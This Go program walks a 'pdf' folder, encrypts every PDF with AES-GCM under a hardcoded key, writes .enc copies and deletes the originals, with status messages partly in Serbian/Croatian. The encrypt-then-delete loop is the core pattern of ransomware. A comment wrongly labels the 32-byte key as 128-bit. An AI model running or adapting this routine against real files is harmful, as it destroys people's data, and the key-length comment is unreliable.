package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"
)

func main() {

	folder := "pdf"
	const aes_key = "854)?_/*5623.01><-AV85Ik*'pm2?!2" //128 bit

	err := filepath.Walk(folder, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Println("Error accessing path:", path, err)
			return err
		}
		if !info.IsDir() && strings.HasSuffix(info.Name(), ".pdf") {

			data, err := os.ReadFile(path)
			if err != nil {
				log.Println("Error reading file:", path, err)
				return err
			}

			file, err := os.Create(path + ".enc")
			if err != nil {
				fmt.Println(err)
			}
			defer file.Close()

			aes_key_byted := []byte(aes_key)

			aes_key_cipher, _ := aes.NewCipher(aes_key_byted)

			gcm, err := cipher.NewGCM(aes_key_cipher)
			if err != nil {
				fmt.Println("Erro through encrypting files", err)
				return err
			}

			nonce := make([]byte, gcm.NonceSize())
			_, err = io.ReadFull(rand.Reader, nonce)

			encrypted_data := gcm.Seal(nonce, nonce, data, nil)

			_, err = file.Write(encrypted_data)
			if err != nil {
				fmt.Println("Neka greska", err)
			}

			err = os.Remove(path)
			if err != nil {
				fmt.Println(err)
			}

			fmt.Println("Enkripcija zavrsena")
		}
		return err
	})

	if err != nil {
		fmt.Println("Error walking through files/folders", err)
		return
	}

}
